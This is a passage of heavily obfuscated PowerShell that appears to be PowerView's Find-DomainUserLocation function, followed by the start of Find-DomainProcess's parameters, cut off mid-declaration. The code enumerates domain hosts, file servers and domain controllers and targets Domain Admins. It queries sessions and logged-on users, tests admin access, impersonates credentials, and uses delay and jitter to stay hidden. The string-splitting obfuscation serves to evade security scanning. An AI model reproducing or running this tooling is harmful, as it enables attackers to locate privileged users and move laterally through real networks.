        if (${p`SBoU`NDPArA`mE`T`erS}[("{2}{0}{3}{4}{5}{1}"-f 'Allo','tion','User','wD','eleg','a')]) { ${Us`ersE`A`RcHera`RguMenTS}[("{2}{1}{0}"-f'ation','eg','AllowDel')] = ${USErA`ll`owd`EL`EgA`TION} }
        if (${p`sBouNd`PA`RaMeterS}[("{0}{1}" -f'Ser','ver')]) { ${useRSE`ARCh`Er`AR`gUMEN`Ts}[("{2}{1}{0}" -f'er','erv','S')] = ${s`ERVeR} }
        if (${Psb`o`UnDP`ArAmete`Rs}[("{1}{3}{0}{2}" -f'S','S','cope','earch')]) { ${useRS`EARchERarGu`meN`Ts}[("{2}{1}{0}" -f'ope','archSc','Se')] = ${seaRChsC`O`Pe} }
        if (${pS`BoUnDpaR`Am`e`Te`RS}[("{0}{1}{2}{3}{4}"-f 'R','es','ultPageS','iz','e')]) { ${usErSeARCh`ER`ARGU`men`TS}[("{1}{0}{3}{2}" -f 'eS','ResultPag','e','iz')] = ${R`esult`P`AGeS`iZe} }
        if (${PS`Bo`UndPa`RAme`TE`Rs}[("{3}{2}{0}{1}" -f 'm','eLimit','verTi','Ser')]) { ${u`SerSE`ARcHEr`A`RG`UME`Nts}[("{4}{3}{0}{1}{2}"-f 'e','rTim','eLimit','erv','S')] = ${Se`RVERt`ImE`li`mIt} }
        if (${PS`BoUn`DpArameT`e`RS}[("{1}{0}"-f 'ombstone','T')]) { ${UsersEarc`hEra`R`gUm`ENts}[("{2}{1}{0}{3}" -f 'n','o','Tombst','e')] = ${tO`mB`sTOne} }
        if (${Psbo`UnD`P`ARaMetE`Rs}[("{0}{2}{1}"-f'Cr','dential','e')]) { ${uSeRseA`RCHer`A`R`g`UME`NTs}[("{0}{1}{2}" -f'Credent','i','al')] = ${cReDe`N`T`Ial} }

        ${tAr`GEt`cOMPU`TerS} = @()

        
        if (${p`s`BoU`Ndp`ARam`EteRS}[("{3}{1}{0}{2}" -f'a','terN','me','Compu')]) {
            ${t`ARg`e`Tc`oM`PUtErs} = @(${ComP`UtE`R`NAmE})
        }
        else {
            if (${p`sbOun`DpA`R`AMeteRS}[("{0}{1}{2}"-f'Stea','lt','h')]) {
                &("{4}{1}{3}{0}{2}"-f'o','Ver','se','b','Write-') ('[F'+'in'+'d-D'+'omainU'+'serLoca'+'ti'+'on] '+'Steal'+'t'+'h '+'enumer'+'ati'+'on '+'u'+'s'+'ing '+'sour'+'ce:'+' '+"$StealthSource")
                ${tARGeT`COM`Pu`TE`RA`R`RayliST} = &("{2}{0}{1}" -f'b','ject','New-O') ("{4}{5}{0}{2}{6}{3}{1}"-f 'llec','t','tion','.ArrayLis','Syste','m.Co','s')

                if (${sTE`Alt`hSourCe} -match ((("{1}{0}{2}"-f 'A','File9p7','ll')).("{0}{1}{2}"-f 'REp','L','ace').Invoke('9p7','|'))) {
                    &("{2}{0}{1}" -f'i','te-Verbose','Wr') ("{9}{8}{11}{0}{2}{10}{5}{4}{6}{1}{3}{7}" -f']','i',' Q','le s',' ','or','f','ervers','ainUser','[Find-Dom','uerying f','Location')
                    ${fI`LeSE`RvERseAr`Ch`Er`ArgU`mEn`Ts} = @{}
                    if (${Ps`BoU`ND`paRam`e`TERs}[("{2}{1}{0}"-f'ain','om','D')]) { ${f`ILes`erv`eRSe`ARcherarG`UMen`TS}[("{1}{0}" -f 'omain','D')] = ${D`Om`AIn} }
                    if (${p`SB`ounDpar`AM`etE`Rs}[("{1}{0}{2}"-f 'ma','ComputerDo','in')]) { ${F`i`Les`eRVER`SEArCheRarGUme`N`Ts}[("{2}{1}{0}"-f 'n','ai','Dom')] = ${c`omp`UteRD`omAIn} }
                    if (${P`s`BoUn`dPAram`Ete`Rs}[("{0}{1}{2}{3}"-f'Comput','erSe','arch','Base')]) { ${fILEsERvErSea`R`cHEraR`g`UMeNTs}[("{0}{2}{1}"-f'Sea','se','rchBa')] = ${COmpU`T`ERs`e`ArCHBa`SE} }
                    if (${p`sbOu`N`DP`ArAmEtERS}[("{0}{2}{1}"-f 'S','ver','er')]) { ${fIlesE`RvER`SeA`RCh`ER`ARG`U`m`EnTs}[("{1}{0}"-f'ver','Ser')] = ${s`eRver} }
                    if (${pSb`oUnDPAra`METe`Rs}[("{1}{0}{2}"-f 'op','SearchSc','e')]) { ${fiLes`ERve`RS`EaRchE`RA`R`GUments}[("{0}{2}{1}"-f 'Se','cope','archS')] = ${se`ArChsc`Ope} }
                    if (${pS`BOundpa`RAmeT`eRs}[("{1}{2}{3}{0}"-f 'ze','Re','s','ultPageSi')]) { ${f`ILesERv`eR`se`ArchEr`ARGumenTS}[("{1}{0}{2}"-f 'geS','ResultPa','ize')] = ${RESU`L`TpAgesI`ze} }
                    if (${PsB`OU`NDPar`AmEtErs}[("{3}{4}{1}{2}{0}"-f 'mit','meL','i','Serve','rTi')]) { ${filesE`RverSeaRcheRA`RgUm`EN`Ts}[("{1}{2}{4}{0}{3}"-f'Li','Ser','verTim','mit','e')] = ${sER`VErTi`Melim`iT} }
                    if (${p`sboUnd`pAra`Me`TerS}[("{1}{2}{0}"-f'bstone','To','m')]) { ${fI`leseRve`RsEa`RCH`Er`ARgu`meNTs}[("{0}{2}{1}" -f'To','stone','mb')] = ${To`mBSto`NE} }
                    if (${PsBo`Und`pARaMe`T`ErS}[("{2}{1}{0}{3}"-f'ia','ent','Cred','l')]) { ${FIleS`ERv`e`R`SeAr`CHERaRGumeN`Ts}[("{1}{0}{2}" -f 'ntia','Crede','l')] = ${C`REdent`iAl} }
                    ${FiLEseR`V`E`Rs} = &("{3}{0}{1}{2}{4}{5}"-f 't','-DomainFil','eS','Ge','e','rver') @FileServerSearcherArguments
                    if (${fI`l`Eserv`Ers} -isnot [System.Array]) { ${F`Il`E`servERs} = @(${FiL`es`eRV`eRs}) }
                    ${Ta`Rg`eTComPu`T`er`ARRayLI`sT}.("{1}{0}" -f 'ge','AddRan').Invoke( ${FI`L`ESEr`Vers} )
                }
                if (${sT`EAl`T`HSOUrCE} -match ((("{1}{0}"-f'So9xAll','DF'))."rEP`lA`Ce"('o9x',[sTRing][char]124))) {
                    &("{1}{2}{0}" -f'e','Wr','ite-Verbos') ("{0}{7}{8}{9}{11}{13}{4}{1}{12}{5}{3}{6}{2}{10}" -f'[Fin','r','r','DFS ','ue',' ','serve','d-Domain','UserLoca','t','s','io','ying for','n] Q')
                    
                    
                }
                if (${sT`eaLTHSo`U`RCE} -match ((("{2}{0}{1}"-f'2sX','All','DC'))-RePlaCe  '2sX',[CHAr]124)) {
                    &("{3}{2}{0}{1}{4}"-f 'V','erbo','ite-','Wr','se') ("{4}{1}{8}{0}{2}{6}{9}{7}{5}{10}{3}"-f 'Doma','d','inUserLocation] Quer','in controllers','[Fin',' ','yi',' for','-','ng','doma')
                    ${DcsE`ARC`H`erAR`g`UME`Nts} = @{
                        ("{0}{1}" -f 'LDA','P') = ${tR`UE}
                    }
                    if (${PSbOu`N`d`pArAMe`TeRs}[("{0}{2}{1}" -f 'Do','n','mai')]) { ${DcS`EarCHERa`R`gU`MeNTS}[("{0}{1}{2}" -f 'D','omai','n')] = ${do`Ma`in} }
                    if (${p`sbO`UndpAR`AmE`TErS}[("{0}{4}{1}{2}{3}"-f 'C','mput','erDoma','in','o')]) { ${dCSea`R`ch`eR`ARgUM`E`NTs}[("{1}{2}{0}"-f 'main','D','o')] = ${CoM`put`eRDom`A`in} }
                    if (${ps`BouND`Pa`RameTerS}[("{1}{0}"-f'rver','Se')]) { ${DCSearc`h`E`RargUMeNts}[("{0}{1}{2}" -f'Se','rve','r')] = ${serv`ER} }
                    if (${PsbOun`D`pARam`ET`eRs}[("{2}{1}{0}" -f 'ntial','de','Cre')]) { ${dcSeA`Rc`heRARG`U`ments}[("{0}{1}{2}" -f 'C','redentia','l')] = ${c`RedE`NTI`Al} }
                    ${dO`mA`INco`N`TRol`LERs} = &("{1}{4}{3}{2}{0}"-f 'ler','Ge','mainControl','o','t-D') @DCSearcherArguments | &("{3}{2}{0}{1}" -f'bje','ct','elect-O','S') -ExpandProperty ("{0}{3}{1}{2}" -f 'dn','na','me','shost')
                    if (${do`MAI`NCO`NTrOl`Le`RS} -isnot [System.Array]) { ${Do`MAin`COn`TroLLeRS} = @(${d`O`MaiNCo`NTR`O`LlErS}) }
                    ${t`ARgeTcO`m`pUTerAR`RayL`I`sT}.("{2}{0}{1}" -f 'd','dRange','A').Invoke( ${D`OmaI`NcO`Ntro`l`lErs} )
                }
                ${TA`RGETcoMpU`TERS} = ${t`ARG`eTc`OmpuT`eRarr`AY`LiSt}.("{0}{1}" -f 'To','Array').Invoke()
            }
            else {
                &("{1}{3}{0}{2}" -f 'e-Verbo','Wri','se','t') ("{7}{15}{19}{12}{8}{10}{13}{2}{16}{5}{0}{1}{4}{3}{11}{14}{18}{17}{9}{6}" -f'or ','all','Q','comp',' ','ying f','n','[F','erL','domai','oca','uters','-DomainUs','tion] ',' in ','i','uer','he ','t','nd')
                ${ta`R`ge`Tc`OMPuTERS} = &("{0}{5}{1}{3}{4}{2}"-f 'Get-D','inC','ter','o','mpu','oma') @ComputerSearcherArguments | &("{3}{0}{1}{4}{2}"-f'e','lec','ject','S','t-Ob') -ExpandProperty ("{0}{1}{2}{3}" -f'd','nshos','tnam','e')
            }
        }
        &("{2}{1}{0}"-f'bose','rite-Ver','W') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "
        if (${Tar`g`EtcOm`PuT`ERS}."l`ENgTH" -eq 0) {
            throw ("{6}{10}{4}{7}{5}{2}{9}{1}{3}{8}{0}" -f'rate','und ','sts','to en',']','o','[Find-DomainUserLo',' No h','ume',' fo','cation')
        }

        
        if (${PsBOuNdPa`Ra`METe`RS}[("{0}{2}{1}"-f 'Cred','l','entia')]) {
            ${CUrrentU`s`er} = ${CrEDen`Ti`Al}.("{3}{5}{1}{2}{4}{0}"-f 'ential','w','ork','Get','Cred','Net').Invoke()."uSerN`A`mE"
        }
        else {
            ${curR`ent`U`sER} = ( (Get-VArIaBlE ("{0}{1}"-f 'S','Ua') -VaLUeo )::"u`Se`RnAme").("{2}{0}{1}" -f 'w','er','ToLo').Invoke()
        }

        
        if (${P`SBOu`Nd`pAr`AM`etERS}[("{0}{1}"-f 'Sho','wAll')]) {
            ${ta`RGe`T`UsERs} = @()
        }
        elseif (${PSBO`U`Nd`pAR`AMeTe`RS}[("{1}{2}{3}{0}"-f'ntity','Us','erI','de')] -or ${psb`ou`Ndp`A`RAmeTERs}[("{2}{3}{1}{0}"-f'ilter','PF','U','serLDA')] -or ${PsbO`UNDpa`RaM`eT`eRS}[("{1}{3}{0}{2}"-f 'SearchBa','Use','se','r')] -or ${ps`BOu`NDPa`R`AmETe`Rs}[("{0}{2}{3}{1}{4}"-f'User','u','AdminC','o','nt')] -or ${Psbo`U`NDP`ArAmeTe`Rs}[("{3}{1}{0}{2}{4}"-f 'lowD','erAl','elegati','Us','on')]) {
            ${tA`RgET`USERs} = &("{0}{3}{2}{1}" -f 'Get-','r','ainUse','Dom') @UserSearcherArguments | &("{3}{1}{0}{2}{4}"-f '-','ct','Obje','Sele','ct') -ExpandProperty ("{3}{0}{2}{1}"-f'a','e','ccountnam','sam')
        }
        else {
            ${grOUPSearC`HE`R`AR`gu`ments} = @{
                ("{0}{1}" -f'Ide','ntity') = ${u`ser`gROu`pId`EntItY}
                ("{0}{2}{1}" -f'R','e','ecurs') = ${tr`Ue}
            }
            if (${P`SB`O`UNdP`A`RaMetErS}[("{3}{2}{1}{0}" -f'ain','m','rDo','Use')]) { ${g`ROU`psearcheR`A`Rgume`N`TS}[("{0}{1}"-f'D','omain')] = ${US`erDo`mA`iN} }
            if (${psBO`UnDp`ARam`eT`erS}[("{2}{1}{3}{0}"-f 'se','ea','UserS','rchBa')]) { ${gRo`Up`SeaRC`H`ErAR`GUm`entS}[("{1}{2}{0}" -f 'Base','Sear','ch')] = ${usERsE`ARCH`BAse} }
            if (${Ps`BOu`Ndp`ArA`METERs}[("{0}{2}{1}" -f 'S','r','erve')]) { ${gr`oU`PSEarChe`R`A`RGUM`eNTs}[("{1}{0}" -f'ver','Ser')] = ${s`e`RveR} }
            if (${PS`B`OunDpARaMete`RS}[("{2}{3}{1}{0}" -f 'e','p','S','earchSco')]) { ${GRO`UPs`e`AR`CH`ErarGUm`e`NTS}[("{2}{1}{0}{3}" -f'p','Sco','Search','e')] = ${s`eaRch`sC`Ope} }
            if (${PsBoUnDP`Ar`AME`TeRS}[("{0}{2}{1}{3}" -f'R','ult','es','PageSize')]) { ${GRO`UP`S`e`ARchE`RArGUMENts}[("{1}{2}{3}{0}{4}"-f'e','Re','s','ultPag','Size')] = ${reS`ULTPaGe`SiZE} }
            if (${P`Sbou`N`dpARamETe`Rs}[("{1}{0}{2}{3}"-f'rTi','Serve','meL','imit')]) { ${gROuPsea`R`CH`E`RAR`gUMEnTS}[("{2}{0}{1}" -f'verTimeLim','it','Ser')] = ${seRVErtI`M`E`L`IMIT} }
            if (${pSBOundpAR`AM`EtE`Rs}[("{0}{2}{3}{1}" -f'Tombst','e','o','n')]) { ${gROupSEA`RC`hE`RArgUM`ENts}[("{0}{1}"-f 'Tombst','one')] = ${t`omb`STone} }
            if (${p`sBoUnDP`ArAme`TeRS}[("{3}{1}{0}{2}"-f't','n','ial','Crede')]) { ${gRoupsEAR`cH`e`R`Arg`UME`NTS}[("{2}{0}{1}{3}"-f 'ed','e','Cr','ntial')] = ${Cr`EdenT`i`Al} }
            ${TaRgEt`U`sE`Rs} = &("{0}{2}{3}{1}{4}{5}"-f 'Get-Do','pMe','m','ainGrou','mbe','r') @GroupSearcherArguments | &("{0}{1}{3}{4}{2}" -f'S','elect','bject','-','O') -ExpandProperty ("{1}{3}{0}{2}" -f 'm','Mem','e','berNa')
        }

        &("{2}{0}{1}"-f'erbos','e','Write-V') "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length) "
        if ((-not ${ShOW`A`lL}) -and (${TaR`GeTusE`RS}."Le`NgtH" -eq 0)) {
            throw ("{7}{14}{13}{0}{4}{9}{6}{3}{10}{8}{12}{1}{5}{2}{11}"-f 'oma','ound to ','arg','catio','in','t','rLo','[Find','o u','Use','n] N','et','sers f','D','-')
        }

        
        ${Ho`StE`NuMbL`o`cK} = {
            Param(${c`OMpu`TernAme}, ${TA`RgE`TUse`Rs}, ${cU`RR`EnTuser}, ${Ste`A`LTH}, ${tokEN`Ha`NDLE})

            if (${Tok`E`NhaNDLe}) {
                
                ${n`UlL} = &("{3}{2}{1}{0}{4}" -f'sonat','UserImper','nvoke-','I','ion') -TokenHandle ${to`KeN`h`ANdLe} -Quiet
            }

            ForEach (${Tar`Getc`O`mp`UtEr} in ${coMp`Ut`e`Rn`AMe}) {
                ${UP} = &("{0}{2}{1}"-f'Test-','tion','Connec') -Count 1 -Quiet -ComputerName ${tARgE`TComPut`ER}
                if (${U`p}) {
                    ${se`SSiO`Ns} = &("{0}{2}{1}{3}"-f'Ge','tSe','t-Ne','ssion') -ComputerName ${tA`RGe`TC`oMpuT`er}
                    ForEach (${S`E`SSion} in ${s`esS`iONS}) {
                        ${UsER`N`Ame} = ${SesS`I`ON}."Us`e`RNAmE"
                        ${c`NamE} = ${sES`s`IoN}."c`Name"

                        if (${c`NAME} -and ${C`NAme}.("{1}{2}{0}"-f'th','Sta','rtsWi').Invoke('\\')) {
                            ${c`NamE} = ${cnA`me}.("{0}{2}{1}"-f'Trim','art','St').Invoke('\')
                        }

                        
                        if ((${us`e`RnaMe}) -and (${uS`eRN`AmE}.("{0}{1}"-f'Tri','m').Invoke() -ne '') -and (${U`s`ErNaME} -notmatch ${Cu`R`Ren`TuseR}) -and (${uSE`R`Na`ME} -notmatch '\$$')) {

                            if ( (-not ${T`Arge`TUseRs}) -or (${TargEtus`E`RS} -contains ${U`s`er`NAME})) {
                                ${U`sE`RL`ocAtIon} = &("{0}{2}{1}" -f'New','ct','-Obje') ("{0}{2}{1}" -f'PSOb','t','jec')
                                ${USERL`OCAT`I`oN} | &("{2}{0}{1}" -f 'dd','-Member','A') ("{0}{2}{3}{1}"-f 'No','y','te','propert') ("{1}{0}{3}{2}" -f'Do','User','in','ma') ${N`ULl}
                                ${us`erLOcA`Ti`on} | &("{1}{2}{0}"-f'ber','Add-','Mem') ("{3}{1}{0}{2}"-f 'r','otep','operty','N') ("{2}{0}{1}"-f'rN','ame','Use') ${uS`Er`NAME}
                                ${Use`RlOC`ATIoN} | &("{0}{3}{1}{2}"-f 'A','Memb','er','dd-') ("{0}{3}{2}{1}"-f'Not','ty','proper','e') ("{1}{3}{0}{2}"-f 'erN','Co','ame','mput') ${TaRG`eTc`OM`PuT`er}
                                ${userl`oC`AT`IoN} | &("{1}{2}{3}{0}"-f'mber','Ad','d-','Me') ("{1}{3}{0}{2}"-f 'epro','No','perty','t') ("{2}{0}{1}{3}" -f'es','s','S','ionFrom') ${cn`AME}

                                
                                try {
                                    ${CN`A`m`eDNsnAme} =  (GET-VaRIABle  ("{0}{1}"-f'o9','hWg'))."val`UE"::("{3}{1}{2}{0}"-f'y','ostEn','tr','GetH').Invoke(${CNA`ME}) | &("{3}{1}{2}{0}" -f 't-Object','ele','c','S') -ExpandProperty ("{2}{1}{0}" -f 'ame','tN','Hos')
                                    ${uS`eRLOcaTI`oN} | &("{2}{1}{0}"-f'Member','d-','Ad') ("{2}{1}{0}" -f'teProperty','o','N') ("{1}{4}{3}{0}{2}" -f 'nFromN','S','ame','ssio','e') ${c`NaMEdn`sN`AmE}
                                }
                                catch {
                                    ${u`SE`RloCaT`ioN} | &("{0}{2}{1}"-f'Add-M','mber','e') ("{0}{2}{3}{1}"-f'NoteP','y','rop','ert') ("{1}{0}{2}"-f'ro','SessionF','mName') ${N`ULL}
                                }

                                
                                if (${c`HeCkaC`c`eSs}) {
                                    ${Ad`M`In} = (&("{4}{3}{2}{0}{1}" -f'cc','ess','nA','Admi','Test-') -ComputerName ${cN`AmE})."ISa`DmiN"
                                    ${u`SeR`L`ocatIoN} | &("{1}{0}{3}{2}" -f 'd-','Ad','ber','Mem') ("{3}{1}{2}{0}"-f'y','ep','ropert','Not') ("{0}{1}{2}" -f 'Loca','lAd','min') ${Ad`MIn}."ISA`DmIN"
                                }
                                else {
                                    ${Us`erlOCat`IOn} | &("{2}{0}{3}{1}"-f'M','ber','Add-','em') ("{0}{2}{1}{3}" -f 'Not','ropert','ep','y') ("{1}{2}{0}" -f'dmin','Loc','alA') ${n`UlL}
                                }
                                ${UseRloc`A`TioN}."pSOb`je`cT"."tY`P`EnamEs".("{1}{0}" -f 't','Inser').Invoke(0, ("{2}{0}{4}{3}{5}{1}"-f'rVi','tion','Powe','w.UserLoc','e','a'))
                                ${usE`RL`ocAt`iON}
                            }
                        }
                    }
                    if (-not ${STE`Al`Th}) {
                        
                        ${l`OGGEd`on} = &("{1}{2}{3}{4}{0}"-f 'don','G','e','t-NetL','ogge') -ComputerName ${TaRgetCO`MP`UTer}
                        ForEach (${u`seR} in ${logG`e`Don}) {
                            ${Us`eRNA`mE} = ${u`SEr}."uS`erNa`mE"
                            ${U`seR`dOMAIn} = ${u`SEr}."L`og`ond`omain"

                            
                            if ((${us`Ern`AME}) -and (${uSeRN`A`me}.("{0}{1}" -f 'tri','m').Invoke() -ne '')) {
                                if ( (-not ${Targ`eTUs`e`RS}) -or (${tA`RGeT`UseRS} -contains ${us`e`Rn`AME}) -and (${Use`Rna`me} -notmatch '\$$')) {
                                    ${ip`A`DDrEsS} = @(&("{4}{0}{5}{3}{1}{2}"-f'solv','ddr','ess','-IPA','Re','e') -ComputerName ${TARge`Tco`M`p`UTer})[0]."IpAdDR`eSS"
                                    ${uSe`RloCATI`oN} = &("{1}{3}{2}{0}"-f 't','N','Objec','ew-') ("{1}{0}" -f't','PSObjec')
                                    ${u`sE`RLo`CATIon} | &("{1}{0}{2}" -f 'e','Add-Memb','r') ("{3}{0}{1}{2}" -f 'te','proper','ty','No') ("{0}{1}{2}" -f'U','serD','omain') ${u`seR`dOmaIN}
                                    ${userL`OCATI`on} | &("{1}{0}{2}"-f'd','Ad','-Member') ("{3}{1}{2}{0}"-f'rty','prop','e','Note') ("{1}{2}{0}" -f'e','Us','erNam') ${US`ern`AMe}
                                    ${UsErLocaT`I`ON} | &("{2}{0}{3}{1}" -f 'd-M','ber','Ad','em') ("{0}{3}{2}{1}" -f'Not','erty','prop','e') ("{2}{1}{0}"-f 'rName','te','Compu') ${targeTc`O`mpu`T`eR}
                                    ${USe`RLoCaT`ioN} | &("{1}{0}{2}" -f'dd-Memb','A','er') ("{0}{1}{3}{2}" -f 'Not','ep','ty','roper') ("{0}{1}{2}"-f'IPAd','d','ress') ${IPA`D`dreSS}
                                    ${uS`eRLOc`AT`iON} | &("{2}{1}{0}"-f'r','e','Add-Memb') ("{1}{0}{2}"-f 't','No','eproperty') ("{1}{2}{0}"-f 'm','Sessio','nFro') ${Nu`ll}
                                    ${us`ER`loCATIon} | &("{0}{1}{2}" -f'Add-','Mem','ber') ("{0}{1}{2}" -f 'N','otepropert','y') ("{3}{0}{2}{1}" -f'sionFromN','me','a','Ses') ${nU`ll}

                                    
                                    if (${cH`Ec`KAcce`Ss}) {
                                        ${adm`IN} = &("{4}{3}{0}{1}{2}" -f 'dmin','Acc','ess','t-A','Tes') -ComputerName ${TaR`GeTC`oMPUT`er}
                                        ${UsEr`LOCa`T`IOn} | &("{2}{0}{1}" -f'd-M','ember','Ad') ("{3}{2}{0}{1}"-f'ro','perty','p','Note') ("{2}{1}{0}"-f 'lAdmin','oca','L') ${adM`IN}."is`ADm`in"
                                    }
                                    else {
                                        ${Us`e`RLoCAT`IoN} | &("{3}{1}{0}{2}" -f'-Me','dd','mber','A') ("{0}{3}{1}{2}" -f 'N','opert','y','otepr') ("{2}{0}{1}"-f 'lAd','min','Loca') ${N`Ull}
                                    }
                                    ${UsERl`oC`A`TIon}."PsOb`j`eCT"."TY`PEN`A`Mes".("{0}{1}"-f 'Ins','ert').Invoke(0, ("{0}{5}{4}{6}{2}{1}{3}"-f 'Po','io','at','n','erView.U','w','serLoc'))
                                    ${U`Serlocat`ioN}
                                }
                            }
                        }
                    }
                }
            }

            if (${TO`kEnHa`N`dLE}) {
                &("{3}{1}{0}{4}{2}{5}"-f'v','n','ke-Reve','I','o','rtToSelf')
            }
        }

        ${l`ogON`T`okEN} = ${n`ULL}
        if (${PSB`o`Undpar`Am`eTErS}[("{2}{1}{0}"-f 'ential','d','Cre')]) {
            if (${ps`BoundPaR`A`meteRS}[("{0}{1}"-f 'Dela','y')] -or ${pSB`o`Undp`ARa`m`ETers}[("{0}{1}{2}" -f'S','to','pOnSuccess')]) {
                ${l`o`G`OnTOKen} = &("{5}{2}{0}{3}{6}{4}{1}" -f 'o','erImpersonation','nv','k','Us','I','e-') -Credential ${cr`EDEntI`AL}
            }
            else {
                ${L`og`oNt`okeN} = &("{1}{4}{0}{3}{5}{2}"-f 'mpersonat','I','n','i','nvoke-UserI','o') -Credential ${c`Re`DentIAL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${Ps`B`oUNdpaR`AmetE`Rs}[("{1}{0}"-f'elay','D')] -or ${psB`oundp`A`RAMeTeRs}[("{2}{1}{3}{0}"-f 'Success','top','S','On')]) {

            &("{2}{0}{1}" -f 'rite-','Verbose','W') "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count) "
            &("{2}{0}{3}{1}" -f 'it','rbose','Wr','e-Ve') ('[Fi'+'nd-'+'Doma'+'inU'+'serLo'+'c'+'a'+'tion] '+'D'+'elay'+': '+"$Delay, "+'Jitte'+'r: '+"$Jitter")
            ${C`OU`NTEr} = 0
            ${rANd`NO} = &("{1}{2}{3}{0}"-f'ct','N','e','w-Obje') ("{1}{0}{2}" -f 'ystem.Ra','S','ndom')

            ForEach (${tA`Rge`T`cOMPU`TeR} in ${TargEt`c`oMpu`Ters}) {
                ${co`Un`TER} = ${COu`NT`Er} + 1

                
                &("{2}{3}{1}{0}"-f'eep','l','S','tart-S') -Seconds ${r`AN`DnO}.("{0}{1}"-f 'Ne','xt').Invoke((1-${ji`TT`ER})*${d`ELaY}, (1+${jIT`T`er})*${deL`Ay})

                &("{1}{2}{3}{0}" -f'-Verbose','Wri','t','e') "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count)) "
                &("{1}{0}{3}{2}{4}" -f 'k','Invo','mm','e-Co','and') -ScriptBlock ${H`Osten`U`mBLoCk} -ArgumentList ${TAr`G`Et`CompuTeR}, ${tarG`etus`e`Rs}, ${C`URRentU`Ser}, ${St`E`ALTH}, ${logON`To`k`eN}

                if (${Re`s`ULT} -and ${stO`pO`NSuc`C`ESS}) {
                    &("{1}{3}{0}{2}"-f 'Verb','Write','ose','-') ("{2}{5}{6}{10}{12}{0}{7}{11}{13}{14}{8}{9}{1}{4}{3}"-f'at','ning e','[F','y','arl','i','nd-Do','i','user found, re','tur','m','on','ainUserLoc','] Target',' ')
                    return
                }
            }
        }
        else {
            &("{2}{1}{0}" -f'e','s','Write-Verbo') ('[F'+'ind'+'-D'+'omain'+'Us'+'erL'+'ocatio'+'n'+'] '+'Usi'+'n'+'g '+'thr'+'eading'+' '+'w'+'ith '+'threa'+'ds: '+"$Threads")
            &("{2}{1}{0}" -f 'erbose','ite-V','Wr') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "

            
            ${S`CRiPTPar`AmS} = @{
                ("{0}{3}{1}{2}"-f'Ta','se','rs','rgetU') = ${TaRgeT`U`seRS}
                ("{1}{2}{0}"-f 'ser','C','urrentU') = ${CuRREnT`U`Ser}
                ("{1}{0}{2}" -f'te','S','alth') = ${S`TEA`ltH}
                ("{2}{3}{1}{0}"-f 'e','ndl','To','kenHa') = ${LO`GoNt`OKEn}
            }

            
            &("{0}{1}{3}{5}{4}{2}" -f'New','-Th','on','reade','ti','dFunc') -ComputerName ${tARGeTCoM`p`Ut`eRS} -ScriptBlock ${HOSTenUm`B`L`oCk} -ScriptParameters ${Scri`P`T`P`Arams} -Threads ${THR`Ea`DS}
        }
    }

    END {
        if (${loG`ONTO`K`eN}) {
            &("{1}{3}{2}{0}{4}{5}"-f'rt','Invoke','ve','-Re','ToSel','f') -TokenHandle ${L`oGON`TokEn}
        }
    }
}


function FiNd-dOM`AinpR`O`CESs {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}" -f'ss','houldProce','PSS'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{2}{1}{4}{0}{3}"-f'y','Cre','sePS','pe','dentialT','PSU'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{6}{1}{0}{3}{2}{4}" -f 'x','lainTe','rP','tFo','assword','PSAvo','idUsingP'}, '')]
    [OutputType({"{1}{2}{4}{3}{0}" -f'ss','PowerView.','UserP','oce','r'})]
    [CmdletBinding(dEfaULTPARAMETerSETname = {"{1}{0}" -f'one','N'})]
    Param(
        [Parameter(POSITION = 0, VaLUEFrOmpiPELINe = ${t`Rue}, VaLUeFRoMPIPELiNebypropertYname = ${t`RUE})]
        [Alias({"{0}{2}{1}" -f 'DNSH','Name','ost'})]
        [String[]]
        ${coMPUT`eR`NA`mE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oma`in},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`O`mpuTeRdOm`A`IN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${co`mPu`T`ErlDAP`FILt`Er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`oMPuTEr`S`Ear`chbaSE},

        [Alias({"{1}{0}{3}{2}" -f'n','Unco','d','straine'})]
        [Switch]
        ${CoMPU`TE`RU`NcONsTr`A`In`Ed},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f 'st','OperatingSy','em'})]
        [String]
        ${COmpuTeROpeRa`T`iN`G`S`YStEM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{3}" -f 'S','e','rvice','Pack'})]
        [String]
        ${Co`mPut`ERSE`R`VICEPAcK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'Si','me','teNa'})]
        [String]
        ${COm`PUte`R`SIt`eNa`me},

        [Parameter(pArameteRSeTnaMe = "t`A`R`GEtProCeSS")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pRO`cES`sNA`ME},

        [Parameter(paRAmetERsEtnAME = "t`ArgETUS`ER")]
        [Parameter(PARAMetErSeTNaME = "USerid`ENTi`Ty")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${UserIDEN`T`ItY},

        [Parameter(paRamEtERseTNAme = "TArge`T`UseR")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${U`seR`dOMa`IN},

        [Parameter(paRameterSETNAMe = "ta`RGE`TUSEr")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${U`s`ER`l`dapFiLtER},

        [Parameter(pARAMeteRseTNaME = "targe`Tus`Er")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${u`SE`RsE`ArCHbAsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{2}" -f 'ro','upN','ame','G'}, {"{1}{0}" -f'up','Gro'})]
        [String[]]
        ${USER`gR`Oupi`D`en`TiTy} = ("{1}{0}{2}" -f' Admin','Domain','s'),

        [Parameter(pARaMeTeRseTname = "T`A`RGETUSer")]
        [Alias({"{1}{0}{2}" -f'd','A','minCount'})]
        [Switch]
        ${u`seR`ADM`i`NCoUNT},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'Controller','Domai','n'})]
        [String]
        ${s`erV`Er},

